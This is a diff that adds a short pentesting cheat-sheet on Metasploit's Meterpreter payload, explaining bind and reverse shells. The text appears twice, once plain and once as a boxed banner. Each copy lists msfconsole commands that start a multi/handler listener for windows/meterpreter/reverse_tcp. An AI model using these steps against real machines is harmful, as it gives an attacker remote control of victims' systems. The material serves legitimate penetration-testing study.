@@ -1,0 +1,49 @@
+Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker 
+can explore the target machine and execute code. Meterpreter is deployed using in-memory DLL injection.
+
+Meterpreter uses a reverse_tcp shell, which means it connects to a listener on the attacker’s machine. 
+There are two popular types of shells: bind and reverse. A bind shell opens up a new service on the 
+target machine, and requires the attacker to connect to it in order to start a session. 
+A reverse shell (also known as a connect-back) requires the attacker to first set up a listener to 
+which the target machine can connect.
+
+-> Example of use
+Start the reverse TCP.
+  msf6> use exploit/multi/handler
+  msf6> info
+  msf6> show options
+  msf6> set LHOST <kali ip>
+  msf6> set payload windows/meterpreter/reverse_tcp
+  msf6> exploit
+
+2. Kali is waiting for reverse connection on <kali ip>:4444
+  msf6> [*] Started reverse TCP handler on 192.168.8.128:4444
+
+>@
+>@###########################################################################################################
+>@#                                                                                                         #
+>@# [ Meterpreter ]                                                                                         #
+>@#                                                                                                         #
+>@# Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker    #
+>@# can explore the target machine and execute code. Meterpreter is deployed using in-memory DLL injection. #
+>@#                                                                                                         #
+>@# Meterpreter uses a reverse_tcp shell, which means it connects to a listener on the attacker’s machine.  #
+>@# There are two popular types of shells: bind and reverse. A bind shell opens up a new service on the     #
+>@# target machine, and requires the attacker to connect to it in order to start a session.                 #
+>@# A reverse shell (also known as a connect-back) requires the attacker to first set up a listener to      #
+>@# which the target machine can connect.                                                                   #
+>@#                                                                                                         #
+>@.---------------------------------------------------------------------------------------------------------.
+>@
+>@-> Example of use
+>@Start the reverse TCP.
+>@  msf6> use exploit/multi/handler
+>@  msf6> info
+>@  msf6> show options
+>@  msf6> set LHOST <kali ip>
+>@  msf6> set payload windows/meterpreter/reverse_tcp
+>@  msf6> exploit
+>@
+>@2. Kali is waiting for reverse connection on <kali ip>:4444
+>@  msf6> [*] Started reverse TCP handler on 192.168.8.128:4444
+>@
